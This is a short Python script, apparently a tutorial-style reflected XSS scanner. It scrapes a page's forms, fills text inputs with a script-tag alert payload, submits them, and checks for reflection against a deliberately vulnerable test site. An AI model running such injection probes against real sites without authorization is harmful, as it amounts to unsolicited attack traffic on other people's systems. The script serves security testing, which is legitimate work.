import requests
from pprint import pprint
from bs4 import BeautifulSoup as bs
from urllib.parse import urljoin


def get_all_forms(url):
    soup = bs(requests.get(url).content, "html.parser")
    return soup.find_all("form")
    
def get_form_details(form):
    form_details = {}
    action = form.attrs.get("action", "").lower()
    method = form.attrs.get("method", "get").lower()
    inputs = []
    for input_tag in form.find_all("input"):
        input_type = input_tag.attrs.get("type", "text")
        input_name = input_tag.attrs.get("name")
        inputs.append({"type": input_type, "name": input_name})
    form_details["action"] = action
    form_details["method"] = method
    form_details["inputs"] = inputs
    return form_details
    
def submit_form(form_details, url, value):
    target_url = urljoin(url, form_details["action"])
    inputs = form_details["inputs"]
    data = {}
    for input in inputs:
        if input["type"] == "text" or input["type"] == "search":
            input["value"] = value
        input_name = input.get("name")
        input_value = input.get("value")
        if input_name and input_value:
            data[input_name] = input_value

    print(f"[+] Submitting malicious payload to {target_url}")
    print(f"[+] Data: {data}")
    if form_details["method"] == "post":
        return requests.post(target_url, data=data)
    else:
        return requests.get(target_url, params=data)
        
        
def scan_xss(url):
	is_vulnerable = False
	forms = get_all_forms(url)
	print(f"[+] Detected {len(forms)} forms on {url}.")
	js_script = "<script>alert('testing xss')</script>"
	for form in forms:
		form_details = get_form_details(form)
		content = submit_form(form_details, url, js_script).content.decode()
		if js_script in content:
			print(f"[+] XSS Detected on {url}")
			print(f"[*] Form details:")
			pprint(form_details)
			is_vulnerable = True
	return is_vulnerable
    
if __name__ == "__main__":
    url = "http://testphp.vulnweb.com/cart.php"
    if scan_xss(url):
    	print("The website is XSS vulnerable")
    
